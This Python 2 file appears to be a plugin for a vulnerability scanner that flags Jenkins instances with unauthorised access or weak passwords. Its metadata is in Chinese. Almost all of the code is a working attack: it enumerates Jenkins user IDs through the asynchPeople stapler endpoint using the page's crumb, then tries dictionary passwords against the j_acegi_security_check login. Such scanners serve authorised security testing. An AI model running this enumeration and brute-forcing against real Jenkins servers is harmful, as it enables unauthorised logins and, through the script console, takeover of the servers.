# coding:utf-8
# author:wolf
import urllib2
import re
import json

def get_plugin_info():
    plugin_info = {
        "name": "Jenkins控制台弱口令",
        "info": "攻击者通过此漏洞可以访问查看项目代码信息，通过script功能可执行命令直接获取服务器权限。",
        "level": "高危",
        "type": "弱口令",
        "author": "wolf@YSRC",
        "url": "https://www.secpulse.com/archives/2166.html",
        "keyword": "tag:jenkins",
        "source": 1
    }
    return plugin_info

def get_user_list(url,timeout):
    user_list = []
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
    try:
        req = opener.open(url + "/asynchPeople/", timeout=timeout)
        res_html = req.read()
    except:
        return user_list
    m = re.search("makeStaplerProxy\('(.*?)','(.*?)'",res_html)
    if m:
        user_url = url + m.group(1)
        crumb = m.group(2)
        request = urllib2.Request(user_url+"/start","[]")
        set_request(request,crumb)
        try:
            opener.open(request, timeout=timeout)
        except:
            pass
        while True:
            request = urllib2.Request(user_url+"/news","[]")
            set_request(request,crumb)
            user_data = opener.open(request, timeout=timeout).read()
            if len(user_data) >=20:
                user_array = json.loads(user_data)
                for _ in user_array["data"]:
                    user_list.append(_["id"].encode("utf-8"))
                if user_array["status"] == "done":break
            else:break
    return user_list

def set_request(request,crumb):
    request.add_header('Content-Type', 'application/x-stapler-method-invocation;charset=UTF-8')
    request.add_header('X-Requested-With', 'XMLHttpRequest')
    request.add_header('Crumb', crumb)

def crack(url,user_list,timeout):
    error_i = 0
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/j_acegi_security_check'
                PostStr = 'j_username=%s&j_password=%s' % (user, password)
                request = urllib2.Request(login_url, PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                if res.code == 200 and "X-Jenkins" in res.headers:
                    info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    return info
            except urllib2.HTTPError, e:
                continue
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return
def check(host, port, timeout):
    url = "http://%s:%d" % (host, int(port))
    try:
        res_html = urllib2.urlopen(url,timeout=timeout).read()
    except urllib2.HTTPError, e:
        res_html = e.read()
    if "/asynchPeople/" in res_html:
        if '"/manage" class="task-link' in res_html:
            return u"未授权访问且为管理员权限"
        user_list = get_user_list(url,timeout)
        result = crack(url,user_list,timeout)
        if result:
            return result
        else:
            return u"未授权访问"
    elif "anonymous" in res_html:
        user_list = ["admin","test"]
        info = crack(url,user_list,timeout)
        return info
